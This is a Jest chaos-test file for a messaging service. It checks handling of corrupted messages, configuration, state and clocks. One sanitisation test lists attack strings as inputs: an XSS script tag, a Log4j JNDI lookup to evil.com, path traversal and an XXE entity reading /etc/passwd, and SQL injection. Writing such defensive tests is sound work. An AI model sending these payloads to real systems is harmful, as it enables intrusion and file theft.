import { EnterpriseDirectCommunicationService } from '../../services/EnterpriseDirectCommunicationService';
import { IEventBus, ILoggingService } from '../../services/interfaces';
import { MessageType, OrchestratorMessage, MessageStatus } from '../../orchestration/MessageProtocol';
import { ChaosTestFramework, FailureType, ChaosExperiment } from './ChaosTestFramework';

// Data Corruption and State Consistency Chaos Tests
describe('Data Corruption and State Consistency Tests', () => {
    let service: EnterpriseDirectCommunicationService;
    let mockEventBus: jest.Mocked<IEventBus>;
    let mockLoggingService: jest.Mocked<ILoggingService>;
    let chaosFramework: ChaosTestFramework;

    beforeEach(() => {
        mockEventBus = {
            publish: jest.fn(),
            subscribe: jest.fn(() => ({ dispose: jest.fn() })),
            unsubscribe: jest.fn(),
            once: jest.fn(() => ({ dispose: jest.fn() })),
            filter: jest.fn(() => ({ event: jest.fn(), dispose: jest.fn() })),
            subscribePattern: jest.fn(() => ({ dispose: jest.fn() })),
            getRegisteredEvents: jest.fn(() => []),
            hasSubscribers: jest.fn(() => true),
            getEventMetrics: jest.fn(() => new Map()),
            getSubscriptionInfo: jest.fn(() => new Map()),
            getUnusedEvents: jest.fn(() => []),
            getOrphanedEvents: jest.fn(() => []),
            dispose: jest.fn()
        };

        mockLoggingService = {
            debug: jest.fn(),
            info: jest.fn(),
            warn: jest.fn(),
            error: jest.fn(),
            isLevelEnabled: jest.fn(() => true),
            onDidChangeConfiguration: jest.fn(() => ({ dispose: jest.fn() }))
        };

        service = new EnterpriseDirectCommunicationService(mockEventBus, mockLoggingService, undefined, undefined, {
            enableCircuitBreaker: true,
            enableSelfHealing: true,
            maxRetryAttempts: 3,
            baseRetryDelay: 100
        });

        chaosFramework = new ChaosTestFramework();

        jest.clearAllMocks();
        jest.useFakeTimers();
    });

    afterEach(() => {
        jest.useRealTimers();
        if (service) {
            service.stop().catch(() => {});
        }
    });

    describe('Message Content Corruption', () => {
        test('should detect and handle corrupted JSON messages', async () => {
            // Arrange
            await service.start();

            const experiment: ChaosExperiment = {
                id: 'json-corruption',
                name: 'JSON Message Corruption',
                description: 'Test handling of corrupted JSON message content',
                duration: 5000,
                targetService: 'MessageProcessing',
                failureType: FailureType.MESSAGE_CORRUPTION,
                parameters: {
                    corruptionType: 'json_malformed',
                    corruptionRate: 0.3, // 30% of messages corrupted
                    corruptionPatterns: ['truncated', 'invalid_chars', 'missing_quotes']
                },
                expectedOutcome: {
                    expectedBehavior: 'graceful_degradation',
                    maxDowntime: 0,
                    dataLossAllowed: false,
                    performanceDegradation: 20,
                    alertsExpected: ['message.corruption.detected', 'validation.failed'],
                    recoverySteps: ['message_validation', 'fallback_processing']
                }
            };

            // Mock EventBus to simulate JSON corruption
            let messageCount = 0;
            mockEventBus.publish.mockImplementation((event, data) => {
                messageCount++;

                // Simulate corruption every 3rd message
                if (messageCount % 3 === 0 && data?.message) {
                    // Corrupt the message content
                    const corrupted = { ...data };
                    if (corrupted.message.content) {
                        const content = corrupted.message.content;
                        // Apply different corruption patterns
                        if (messageCount % 9 === 0) {
                            // Truncated JSON
                            corrupted.message.content = content.substring(0, content.length / 2);
                        } else if (messageCount % 6 === 0) {
                            // Invalid characters
                            corrupted.message.content = content + '\u0000\uFFFF';
                        } else {
                            // Missing quotes (invalid JSON structure)
                            corrupted.message.content = content.replace(/"/g, '');
                        }
                    }
                }

                // Normal processing for non-corrupted messages
                return Promise.resolve();
            });

            // Act - Send messages that may get corrupted
            const results = [];
            for (let i = 0; i < 30; i++) {
                results.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: JSON.stringify({
                            operation: 'test_operation',
                            data: { index: i, value: `test_value_${i}` },
                            metadata: { timestamp: Date.now() }
                        }),
                        metadata: {
                            requiresValidation: true,
                            messageId: `test-${i}`
                        }
                    })
                );
            }

            // Assert
            const successRate = results.filter(r => r.success).length / 30;
            const failedResults = results.filter(r => !r.success);

            expect(successRate).toBeGreaterThan(0.7); // Most should still succeed
            expect(failedResults.length).toBeGreaterThan(0); // Some should fail due to corruption

            // Verify that corruption was detected and handled
            expect(mockLoggingService.warn).toHaveBeenCalledWith(
                expect.stringContaining('Message validation failed'),
                expect.any(Object)
            );
        });

        test('should sanitize potentially malicious message content', async () => {
            // Arrange
            await service.start();

            // Test various malicious payloads
            const maliciousPayloads = [
                '<script>alert("xss")</script>',
                '${jndi:ldap://evil.com/x}', // Log4j style injection
                '../../../etc/passwd', // Path traversal
                'DROP TABLE users;', // SQL injection
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', // XXE
                'javascript:alert(1)', // JavaScript URL
                '\u0000\u0001\u0002\u0003', // Control characters
                'a'.repeat(10000) // Extremely long content
            ];

            // Act - Send messages with malicious content
            const results = [];
            for (let i = 0; i < maliciousPayloads.length; i++) {
                results.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: maliciousPayloads[i],
                        metadata: {
                            sanitize: true,
                            payloadType: 'potentially_malicious'
                        }
                    })
                );
            }

            // Assert
            const successRate = results.filter(r => r.success).length / maliciousPayloads.length;
            expect(successRate).toBeGreaterThan(0.8); // Service should handle malicious content

            // Verify content was sanitized by checking EventBus calls
            const publishCalls = mockEventBus.publish.mock.calls;
            publishCalls.forEach(call => {
                const data = call[1];
                if (data?.message?.content) {
                    const sanitizedContent = data.message.content;

                    // Should not contain dangerous patterns
                    expect(sanitizedContent).not.toContain('<script>');
                    expect(sanitizedContent).not.toContain('javascript:');
                    expect(sanitizedContent).not.toContain('\u0000');

                    // Should be reasonably sized
                    expect(sanitizedContent.length).toBeLessThan(1000);
                }
            });
        });

        test('should handle binary data corruption gracefully', async () => {
            // Arrange
            await service.start();

            // Create messages with binary-like content
            const binaryData = new Uint8Array([0x00, 0xff, 0x7f, 0x80, 0x01, 0xfe]);
            const base64Data = btoa(String.fromCharCode(...binaryData));

            // Act - Send message with binary content
            const result = await service.sendMessage({
                type: MessageType.SPAWN_AGENT,
                content: base64Data,
                metadata: {
                    contentType: 'binary',
                    encoding: 'base64'
                }
            });

            // Simulate corruption during transmission
            const corruptedData = base64Data.substring(0, base64Data.length - 2) + '@@'; // Invalid base64

            const corruptedResult = await service.sendMessage({
                type: MessageType.SPAWN_AGENT,
                content: corruptedData,
                metadata: {
                    contentType: 'binary',
                    encoding: 'base64'
                }
            });

            // Assert
            expect(result.success).toBe(true); // Valid binary should work
            expect(corruptedResult.success).toBe(false); // Corrupted binary should be rejected

            // Should log validation errors for corrupted binary
            expect(mockLoggingService.error).toHaveBeenCalledWith(
                expect.stringContaining('Failed to send message'),
                expect.any(Object)
            );
        });
    });

    describe('State Corruption and Consistency', () => {
        test('should detect and recover from inconsistent internal state', async () => {
            // Arrange
            await service.start();

            // Simulate sending messages that should create consistent state
            const initialMessages = [];
            for (let i = 0; i < 10; i++) {
                initialMessages.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Initial state message ${i}`,
                        metadata: { stateId: `state-${i}` }
                    })
                );
            }

            // Verify initial state is healthy
            let healthStatus = service.getHealthStatus();
            expect(healthStatus.status).toBe('healthy');

            // Act - Simulate state corruption by manipulating service internals
            // This would be done through reflection or testing hooks in a real scenario

            // Force unhealthy state by simulating high failure rate
            mockEventBus.publish.mockImplementation(() => {
                throw new Error('State corruption simulation');
            });

            const corruptedStateMessages = [];
            for (let i = 0; i < 20; i++) {
                corruptedStateMessages.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Corrupted state message ${i}`,
                        metadata: { stateId: `corrupted-${i}` }
                    })
                );
            }

            // Check that state is now unhealthy
            healthStatus = service.getHealthStatus();
            expect(healthStatus.healthScore).toBeLessThan(50);

            // Trigger self-healing
            jest.advanceTimersByTime(10000);

            // Restore normal operation
            mockEventBus.publish.mockImplementation(jest.fn());

            // Wait for recovery
            jest.advanceTimersByTime(35000);

            // Send recovery verification messages
            const recoveryMessages = [];
            for (let i = 0; i < 5; i++) {
                recoveryMessages.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Recovery verification message ${i}`,
                        metadata: { recovery: true }
                    })
                );
            }

            // Assert
            const recoverySuccessRate = recoveryMessages.filter(r => r.success).length / 5;
            expect(recoverySuccessRate).toBeGreaterThan(0.8);

            // State should be healthy again
            healthStatus = service.getHealthStatus();
            expect(healthStatus.healthScore).toBeGreaterThan(70);

            // Verify self-healing was triggered
            expect(mockLoggingService.warn).toHaveBeenCalledWith(
                expect.stringContaining('Triggering self-healing'),
                expect.any(Object)
            );
        });

        test('should maintain consistency during concurrent state modifications', async () => {
            // Arrange
            await service.start();

            const concurrentOperations = [];
            const operationResults: Array<{ id: string; success: boolean; timestamp: number }> = [];

            // Act - Create many concurrent operations that modify state
            for (let i = 0; i < 100; i++) {
                const operationId = `concurrent-op-${i}`;

                concurrentOperations.push(
                    service
                        .sendMessage({
                            type: MessageType.SPAWN_AGENT,
                            content: `Concurrent operation ${i}`,
                            metadata: {
                                operationId,
                                modifiesState: true,
                                priority: Math.random() > 0.5 ? 'high' : 'normal'
                            }
                        })
                        .then(result => {
                            operationResults.push({
                                id: operationId,
                                success: result.success,
                                timestamp: Date.now()
                            });
                        })
                );
            }

            // Wait for all concurrent operations to complete
            jest.advanceTimersByTime(2000);
            await Promise.all(concurrentOperations);

            // Assert
            const successfulOps = operationResults.filter(r => r.success).length;
            const successRate = successfulOps / 100;

            expect(successRate).toBeGreaterThan(0.9); // High success rate expected

            // Verify operations were processed in reasonable time order
            const timestamps = operationResults.map(r => r.timestamp).sort();
            const timeSpread = timestamps[timestamps.length - 1] - timestamps[0];
            expect(timeSpread).toBeLessThan(10000); // All operations within 10 seconds

            // No race conditions should have caused inconsistent state
            const healthStatus = service.getHealthStatus();
            expect(healthStatus.status).toBe('healthy');
        });

        test('should handle message ordering consistency', async () => {
            // Arrange
            await service.start();

            const orderedMessages: Array<{ id: string; sequence: number; timestamp: number }> = [];

            // Track message processing order
            mockEventBus.publish.mockImplementation((event, data) => {
                if (data?.message?.metadata?.sequence !== undefined) {
                    orderedMessages.push({
                        id: data.message.id,
                        sequence: data.message.metadata.sequence,
                        timestamp: Date.now()
                    });
                }
                return Promise.resolve();
            });

            // Act - Send messages with sequence numbers
            const messagePromises = [];
            for (let i = 0; i < 50; i++) {
                messagePromises.push(
                    service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Ordered message ${i}`,
                        metadata: {
                            sequence: i,
                            requiresOrdering: true
                        }
                    })
                );
            }

            await Promise.all(messagePromises);

            // Assert
            expect(orderedMessages.length).toBe(50);

            // Verify messages were processed (not necessarily in strict order due to async nature)
            const processedSequences = orderedMessages.map(m => m.sequence).sort((a, b) => a - b);
            expect(processedSequences).toEqual(Array.from({ length: 50 }, (_, i) => i));

            // Check for severe ordering violations (messages arriving way out of order)
            let severeOrderingViolations = 0;
            for (let i = 1; i < orderedMessages.length; i++) {
                const currentSeq = orderedMessages[i].sequence;
                const prevSeq = orderedMessages[i - 1].sequence;

                if (Math.abs(currentSeq - prevSeq) > 10) {
                    severeOrderingViolations++;
                }
            }

            expect(severeOrderingViolations).toBeLessThan(5); // Allow some minor reordering
        });
    });

    describe('Configuration Corruption', () => {
        test('should handle corrupted configuration gracefully', async () => {
            // Arrange
            await service.start();

            // Simulate configuration corruption
            const experiment: ChaosExperiment = {
                id: 'config-corruption',
                name: 'Configuration Corruption',
                description: 'Test handling of corrupted service configuration',
                duration: 5000,
                targetService: 'Configuration',
                failureType: FailureType.CONFIGURATION_CORRUPTION,
                parameters: {
                    corruptionType: 'values_invalid',
                    affectedSettings: ['maxRetryAttempts', 'baseRetryDelay', 'maxMessageHistorySize']
                },
                expectedOutcome: {
                    expectedBehavior: 'graceful_degradation',
                    maxDowntime: 1000,
                    dataLossAllowed: false,
                    performanceDegradation: 30,
                    alertsExpected: ['config.corruption.detected'],
                    recoverySteps: ['fallback_defaults', 'config_validation']
                }
            };

            // Act - Create a new service instance with corrupted config
            const corruptedService = new EnterpriseDirectCommunicationService(
                mockEventBus,
                mockLoggingService,
                undefined,
                undefined,
                {
                    maxRetryAttempts: -1, // Invalid negative value
                    baseRetryDelay: 'invalid' as any, // Wrong type
                    maxMessageHistorySize: 0, // Invalid zero value
                    enableCircuitBreaker: 'maybe' as any // Wrong type
                }
            );

            // Should fall back to defaults or handle gracefully
            expect(() => corruptedService).not.toThrow();

            // Try to start with corrupted config
            let startResult;
            try {
                startResult = await corruptedService.start();
            } catch (error) {
                startResult = error;
            }

            // Assert
            // Service should either start with defaults or fail gracefully
            if (startResult instanceof Error) {
                expect(mockLoggingService.error).toHaveBeenCalledWith(
                    expect.stringContaining('Configuration validation failed'),
                    expect.any(Object)
                );
            } else {
                // If started successfully, should use safe defaults
                const health = corruptedService.getHealthStatus();
                expect(health).toBeDefined();
            }

            await corruptedService.stop().catch(() => {});
        });

        test('should validate configuration changes at runtime', async () => {
            // Arrange
            await service.start();

            // Act - Try to send messages after service is running
            const preChangeResults = [];
            for (let i = 0; i < 5; i++) {
                preChangeResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Pre-change message ${i}`
                    })
                );
            }

            // Simulate runtime configuration change that might affect behavior
            // In a real scenario, this would be done through configuration service
            // For testing, we'll verify the service handles various scenarios

            const postChangeResults = [];
            for (let i = 0; i < 5; i++) {
                postChangeResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Post-change message ${i}`
                    })
                );
            }

            // Assert
            const preSuccessRate = preChangeResults.filter(r => r.success).length / 5;
            const postSuccessRate = postChangeResults.filter(r => r.success).length / 5;

            expect(preSuccessRate).toBe(1.0); // Should work before change
            expect(postSuccessRate).toBeGreaterThan(0.8); // Should adapt to changes
        });
    });

    describe('Memory Corruption Simulation', () => {
        test('should detect and handle memory corruption patterns', async () => {
            // Arrange
            await service.start();

            // Simulate memory corruption by creating objects with corrupted properties
            const corruptedObjects = [];
            for (let i = 0; i < 100; i++) {
                const obj: any = {
                    id: i,
                    data: `data-${i}`,
                    timestamp: Date.now()
                };

                // Corrupt some objects
                if (i % 7 === 0) {
                    obj.id = null; // Null ID corruption
                } else if (i % 11 === 0) {
                    obj.data = undefined; // Undefined data corruption
                } else if (i % 13 === 0) {
                    obj.timestamp = 'invalid'; // Type corruption
                }

                corruptedObjects.push(obj);
            }

            // Act - Process potentially corrupted objects
            const results = [];
            for (const obj of corruptedObjects) {
                try {
                    results.push(
                        await service.sendMessage({
                            type: MessageType.SPAWN_AGENT,
                            content: JSON.stringify(obj),
                            metadata: {
                                objectId: obj.id,
                                potentiallyCorrupted: true
                            }
                        })
                    );
                } catch (error) {
                    results.push({
                        success: false,
                        error: error,
                        processingTimeMs: 0,
                        operationId: 'corrupted'
                    });
                }
            }

            // Assert
            const successfulResults = results.filter(r => r.success);
            const failedResults = results.filter(r => !r.success);

            // Service should handle most objects, rejecting clearly corrupted ones
            expect(successfulResults.length).toBeGreaterThan(80);
            expect(failedResults.length).toBeGreaterThan(0);

            // Failed objects should be the corrupted ones
            const failedMetadata = failedResults.map(r => r.error?.context?.metadata).filter(Boolean);

            // Service should still be healthy despite corruption
            const health = service.getHealthStatus();
            expect(health.status).toBe('healthy');
        });

        test('should prevent memory leaks from corrupted data structures', async () => {
            // Arrange
            await service.start();

            const initialMemory = process.memoryUsage?.() || { heapUsed: 0 };

            // Act - Process large amounts of potentially corrupted data
            const largeDataSet = [];
            for (let batch = 0; batch < 10; batch++) {
                const batchPromises = [];

                for (let i = 0; i < 100; i++) {
                    const largeContent = 'x'.repeat(1000); // 1KB per message
                    const potentiallyCorrupted = {
                        type: MessageType.SPAWN_AGENT,
                        content: largeContent,
                        metadata: {
                            batchId: batch,
                            messageId: i,
                            size: 'large'
                        }
                    };

                    // Introduce corruption in some messages
                    if (Math.random() < 0.1) {
                        potentiallyCorrupted.content = null as any; // Null content
                    }

                    batchPromises.push(service.sendMessage(potentiallyCorrupted));
                }

                await Promise.all(batchPromises);
                largeDataSet.push(batch);

                // Force garbage collection if available
                if (global.gc) {
                    global.gc();
                }

                jest.advanceTimersByTime(1000);
            }

            // Trigger cleanup cycles
            jest.advanceTimersByTime(300000); // 5 minutes for cleanup

            const finalMemory = process.memoryUsage?.() || { heapUsed: 0 };
            const memoryGrowth = finalMemory.heapUsed - initialMemory.heapUsed;

            // Assert
            // Memory growth should be reasonable (less than 100MB for this test)
            expect(memoryGrowth).toBeLessThan(100 * 1024 * 1024);

            // Service should still be operational
            const health = service.getHealthStatus();
            expect(health.status).toBe('healthy');

            // Should have processed all batches
            expect(largeDataSet.length).toBe(10);
        });
    });

    describe('Timestamp and Clock Corruption', () => {
        test('should handle system clock manipulation', async () => {
            // Arrange
            await service.start();

            const originalDateNow = Date.now;
            let timeManipulation = 0;

            // Mock Date.now to simulate clock skew/manipulation
            Date.now = jest.fn(() => {
                const realTime = originalDateNow();
                return realTime + timeManipulation;
            });

            // Act - Send messages with normal time
            const normalTimeResults = [];
            for (let i = 0; i < 5; i++) {
                normalTimeResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Normal time message ${i}`,
                        metadata: { timeTest: 'normal' }
                    })
                );
            }

            // Jump time forward dramatically
            timeManipulation = 24 * 60 * 60 * 1000; // 24 hours forward

            const futureTimeResults = [];
            for (let i = 0; i < 5; i++) {
                futureTimeResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Future time message ${i}`,
                        metadata: { timeTest: 'future' }
                    })
                );
            }

            // Jump time backward
            timeManipulation = -2 * 60 * 60 * 1000; // 2 hours back

            const pastTimeResults = [];
            for (let i = 0; i < 5; i++) {
                pastTimeResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `Past time message ${i}`,
                        metadata: { timeTest: 'past' }
                    })
                );
            }

            // Restore normal time
            Date.now = originalDateNow;

            // Assert
            const normalSuccessRate = normalTimeResults.filter(r => r.success).length / 5;
            const futureSuccessRate = futureTimeResults.filter(r => r.success).length / 5;
            const pastSuccessRate = pastTimeResults.filter(r => r.success).length / 5;

            expect(normalSuccessRate).toBe(1.0); // Normal time should work perfectly
            expect(futureSuccessRate).toBeGreaterThan(0.6); // Future time might cause issues but should mostly work
            expect(pastSuccessRate).toBeGreaterThan(0.6); // Past time might cause issues but should mostly work

            // Service should remain healthy despite time manipulation
            const health = service.getHealthStatus();
            expect(health.status).toBe('healthy');
        });

        test('should handle timezone changes and DST transitions', async () => {
            // Arrange
            await service.start();

            // Mock timezone behavior
            const originalToISOString = Date.prototype.toISOString;
            let timezoneOffset = 0;

            Date.prototype.toISOString = function () {
                const adjustedTime = new Date(this.getTime() + timezoneOffset * 60 * 60 * 1000);
                return originalToISOString.call(adjustedTime);
            };

            // Act - Send messages across different timezone scenarios

            // UTC (normal)
            timezoneOffset = 0;
            const utcResults = [];
            for (let i = 0; i < 3; i++) {
                utcResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `UTC message ${i}`,
                        metadata: { timezone: 'UTC' }
                    })
                );
            }

            // EST (UTC-5)
            timezoneOffset = -5;
            const estResults = [];
            for (let i = 0; i < 3; i++) {
                estResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `EST message ${i}`,
                        metadata: { timezone: 'EST' }
                    })
                );
            }

            // JST (UTC+9)
            timezoneOffset = 9;
            const jstResults = [];
            for (let i = 0; i < 3; i++) {
                jstResults.push(
                    await service.sendMessage({
                        type: MessageType.SPAWN_AGENT,
                        content: `JST message ${i}`,
                        metadata: { timezone: 'JST' }
                    })
                );
            }

            // Restore original behavior
            Date.prototype.toISOString = originalToISOString;

            // Assert
            const utcSuccessRate = utcResults.filter(r => r.success).length / 3;
            const estSuccessRate = estResults.filter(r => r.success).length / 3;
            const jstSuccessRate = jstResults.filter(r => r.success).length / 3;

            expect(utcSuccessRate).toBe(1.0);
            expect(estSuccessRate).toBeGreaterThan(0.8); // Should handle timezone differences
            expect(jstSuccessRate).toBeGreaterThan(0.8); // Should handle timezone differences

            // All operations should complete successfully regardless of timezone
            const allResults = [...utcResults, ...estResults, ...jstResults];
            expect(allResults.every(r => typeof r.processingTimeMs === 'number')).toBe(true);
        });
    });
});
